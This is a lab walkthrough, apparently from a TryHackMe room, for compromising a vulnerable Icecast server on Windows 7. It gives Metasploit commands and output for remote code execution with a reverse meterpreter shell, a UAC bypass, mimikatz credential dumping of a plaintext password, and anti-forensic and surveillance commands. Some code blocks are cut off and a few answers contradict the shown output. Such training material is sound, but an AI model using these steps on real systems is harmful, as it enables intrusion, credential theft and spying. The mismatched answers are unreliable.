Deploy & hack into a Windows machine, exploiting a very poorly secured media server.

## Recon 
- Launch a scan against our target machine, I recommend using a SYN scan set to scan all ports on the machine.

    ```bash
    $ rustscan -a 10.10.169.246 --ulimit 10000 -- -A -v -PS
    .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.

- Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?
> 3389

- What service did nmap identify as running on port 8000? (First word of this service)
> Icecast

- What does Nmap identify as the hostname of the machine? (All caps for the answer)
> 
What does Nmap identify as the hostname of the machine? (All caps for the answer)

## Gain Access
- Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What type of vulnerability is it? Use https://www.cvedetails.com for this question and the next.
> Execute Code Overflow. From [here](https://www.cvedetails.com/cve/CVE-2004-1561/).

- What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
> CVE-2004-1561

- Let's start metasploit. After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module? 

    ```bash
    msf6 > search icecast

    Matching Modules
    ================

    #  Name                                 Disclosure Date  Rank   Check  Description
    -  ----                                 ---------------  ----   -----  -----------
    0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


    Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header
    ```

- Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?

    ```bash
    msf6 exploit(windows/http/icecast_header) > show options 

    Module options (exploit/windows/http/icecast_header):

    Name    Current Setting  Required  Description
    ----    ---------------  --------  -----------
    RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
    RPORT   8000             yes       The target port (TCP)


    Payload options (windows/meterpreter/reverse_tcp):

    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
    LHOST     192.168.40.129   yes       The listen address (an interface may be specified)
    LPORT     4444             yes       The listen port


    Exploit target:

    Id  Name
    --  ----
    0   Automatic
    ```

    It's RHOSTS.

- First let's check that the LHOST option is set to our tun0 IP (which can be found on the access page). With that done, let's set that last option to our target IP. Now that we have everything ready to go, let's run our exploit using the command `exploit`

    ```bash
    msf6 exploit(windows/http/icecast_header) > set LHOST 10.11.25.205
    LHOST => 10.11.25.205
    msf6 exploit(windows/http/icecast_header) > set RHOSTS 10.10.169.246
    RHOSTS => 10.10.169.246
    msf6 exploit(windows/http/icecast_header) > 
    msf6 exploit(windows/http/icecast_header) > run

    [*] Started reverse TCP handler on 10.11.25.205:4444 
    [*] Sending stage (175174 bytes) to 10.10.169.246

    meterpreter >
    ```

## Escalate
- Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?
> meterpreter
- What user was running that Icecast process?

    ```bash
    meterpreter > getuid
    Server username: Dark-PC\Dark
    ```

- What build of Windows is the system?

    ```bash
    meterpreter > sysinfo
    Computer        : DARK-PC
    OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 2
    Meterpreter     : x86/windows
    ```

- Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running?
> x64

- Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete*

    ```bash
    meterpreter > run post/multi/recon/local_exploit_suggester

    [*] 10.10.169.246 - Collecting local exploits for x86/windows...
    [*] 10.10.169.246 - 36 exploit checks are being tried...

    [+] 10.10.169.246 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
    [+] 10.10.169.246 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
    [+] 10.10.169.246 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
    [+] 10.10.169.246 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
    [+] 10.10.169.246 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
    [+] 10.10.169.246 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
    [+] 10.10.169.246 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
    ```

- Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?
> exploit/windows/local/bypassuac_eventvwr

- Now that we have an exploit in mind for elevating our privileges, let's background our current session using the command `background` or `CTRL + z`. Take note of what session number we have, this will likely be 1 in this case. We can list all of our active sessions using the command `sessions` when outside of the meterpreter shell.

- Go ahead and select our previously found local exploit for use using the command `use FULL_PATH_FOR_EXPLOIT`

    ```bash
    msf6 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr
    [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
    msf6 exploit(windows/local/bypassuac_eventvwr) >
    ```

- Local exploits require a session to be selected (something we can verify with the command `show options`), set this now using the command `set session SESSION_NUMBER`

    ```bash
    msf6 exploit(windows/local/bypassuac_eventvwr) > show options 

    Module options (exploit/windows/local/bypassuac_eventvwr):

    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
    SESSION                   yes       The session to run this module on.


    Payload options (windows/meterpreter/reverse_tcp):

    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
    LHOST     192.168.40.129   yes       The listen address (an interface may be specified)
    LPORT     4444             yes       The listen port


    Exploit target:

    Id  Name
    --  ----
    0   Windows x86


    msf6 exploit(windows/local/bypassuac_eventvwr) > set session 2
    session => 2
    ```

- Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option?
> LHOST

- Set this option now. You might have to check your IP on the TryHackMe network using the command `ip addr`

    ```bash
    msf6 exploit(windows/local/bypassuac_eventvwr) > set lhost 10.11.25.205
    lhost => 10.11.25.205
    ```

- After we've set this last option, we can now run our privilege escalation exploit. Run this now using the command `run`. Note, this might take a few attempts and you may need to relaunch the box and exploit the service in the case that this fails.

    ```bash
    msf6 exploit(windows/local/bypassuac_eventvwr) > run

    [*] Started reverse TCP handler on 10.11.25.205:4444

    [*] Cleaning up registry keys ...
    ```

- Following completion of the privilege escalation a new session will be opened. Interact with it now using the command `sessions SESSION_NUMBER`

    ```bash
    meterpreter > sessions 4
    [*] Session 4 is already interactive.
    ```

- We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?

    ```bash
    meterpreter > getprivs

    SeTimeZonePrivilege
    SeUndockPrivilege
    ```

    It's `SeTakeOwnershipPrivilege`.

## Looting
- Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. First, let's list the processes using the command `ps`. Note, we can see processes being run by NT AUTHORITY\SYSTEM as we have escalated permissions (even though our process doesn't).

    ```bash
    meterpreter > ps

- In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?<br>Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell. 
> spoolsv.exe

- Migrate to this process now with the command `migrate -N PROCESS_NAME`

    ```bash
    meterpreter > migrate -N spoolsv.exe
    [*] Migrating from 3932 to 1368...
    [*] Migration completed successfully.
    ```

- Let's check what user we are now with the command `getuid`. What user is listed?

    ```bash
    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM
    ```

- Now that we've made our way to full administrator permissions we'll set our sights on looting. Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz)

    ```bash
    meterpreter > load kiwi
    Loading extension kiwi...
    .#####.   mimikatz 2.2.0 20191125 (x64/windows)
    .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)

    '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

    Success.
    ```

- Loading kiwi into our meterpreter session will expand our help menu, take a look at the newly added section of the help menu now via the command `help`.

    ```

- Which command allows up to retrieve all credentials?
> creds_all

- Run this command now. What is Dark's password? Mimikatz allows us to steal this password out of memory even without the user 'Dark' logged in as there is a scheduled task that runs the Icecast as the user 'Dark'. It also helps that Windows Defender isn't running on the box ;) (Take a look again at the ps list, this box isn't in the best shape with both the firewall and defender disabled)

    ```bash
    meterpreter > creds_all
    [+] Running as SYSTEM
    [*] Retrieving all credentials
    msv credentials
    ===============

    Username  Domain   LM                                NTLM                              SHA1
    --------  ------   --                                ----                              ----

    wdigest credentials
    ===================

    Username  Domain     Password

    Dark      Dark-PC    Password01!

    tspkg credentials
    =================

    Username  Domain   Password
    --------  ------   --------
    Dark      Dark-PC  Password01!

    kerberos credentials
    ====================

    Username  Domain     Password
    --------  ------     --------
    (null)    (null)     (null)
    Dark      Dark-PC    Password01!
    dark-pc$  WORKGROUP  (null)
    ```

    It's `Password01!`.

## Post-Exploitation
- What command allows us to dump all of the password hashes stored on the system? We won't crack the Administrative password in this case as it's pretty strong (this is intentional to avoid password spraying attempts)
> hashdump

- While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time?
> screenshare

- How about if we wanted to record from a microphone attached to the system?
> record_mic

- To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? Don't ever do this on a pentest unless you're explicitly allowed to do so! This is not beneficial to the defending team as they try to breakdown the events of the pentest after the fact.
> timestomp

- Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?<br>Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.
> golden_ticket_create

- One last thing to note. As we have the password for the user 'Dark' we can now authenticate to the machine and access it via remote desktop (MSRDP). As this is a workstation, we'd likely kick whatever user is signed onto it off if we connect to it, however, it's always interesting to remote into machines and view them as their users do. If this hasn't already been enabled, we can enable it via the following Metasploit module: `run post/windows/manage/enable_rdp`

    ```bash
    meterpreter > run post/windows/manage/enable_rdp

    [*] Enabling Remote Desktop
    [*]     RDP is already enabled
    [*] Setting Terminal Services service startup mode
    [*]     The Terminal Services service is not set to auto, changing it to auto ...
    [*]     Opening port in local firewall if necessary
    [*] For cleanup execute Meterpreter resource file: /home/kali/.msf4/loot/20210128043458_default_10.10.169.246_host.windows.cle_648851.txt
